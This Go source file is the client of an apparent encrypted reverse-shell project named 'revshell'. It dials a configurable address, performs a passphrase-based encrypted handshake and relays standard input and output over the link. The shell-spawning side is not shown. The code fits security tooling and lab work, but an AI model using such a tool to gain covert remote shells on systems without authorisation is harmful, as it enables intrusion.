package main

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"revshell/pkg/secureio"
)

func main() {
	available := strings.Join(secureio.ListCipherSuites(), ", ")
	addr := flag.String("addr", "127.0.0.1:2222", "remote server address")
	pass := flag.String("pass", "", "shared passphrase used to derive encryption keys")
	cipherName := flag.String("cipher", "aes", fmt.Sprintf("cipher suite to use (%s)", available))
	flag.Parse()

	if *pass == "" {
		fmt.Fprintln(os.Stderr, "client: passphrase must be provided via -pass")
		os.Exit(1)
	}

	conn, err := net.Dial("tcp", *addr)
	if err != nil {
		log.Fatalf("client: failed to connect to %s: %v", *addr, err)
	}
	defer conn.Close()

	reader, writer, err := secureio.Handshake(conn, false, *pass, *cipherName)
	if err != nil {
		log.Fatalf("client: handshake failed: %v", err)
	}

	log.Printf("client: connected to %s using %s cipher", *addr, *cipherName)

	doneReading := make(chan error, 1)
	doneWriting := make(chan error, 1)

	go func() {
		_, err := io.Copy(os.Stdout, reader)
		doneReading <- err
	}()

	go func() {
		_, err := io.Copy(writer, os.Stdin)
		if tcpConn, ok := conn.(*net.TCPConn); ok {
			_ = tcpConn.CloseWrite()
		}
		doneWriting <- err
	}()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	var readErr error
	select {
	case readErr = <-doneReading:
		if readErr != nil && !errors.Is(readErr, io.EOF) {
			log.Printf("client: read error: %v", readErr)
		}
	case sig := <-sigCh:
		log.Printf("client: received signal %s, shutting down", sig)
	}

	_ = conn.Close()
	if writeErr := <-doneWriting; writeErr != nil && !errors.Is(writeErr, os.ErrClosed) {
		log.Printf("client: write error: %v", writeErr)
	}
}
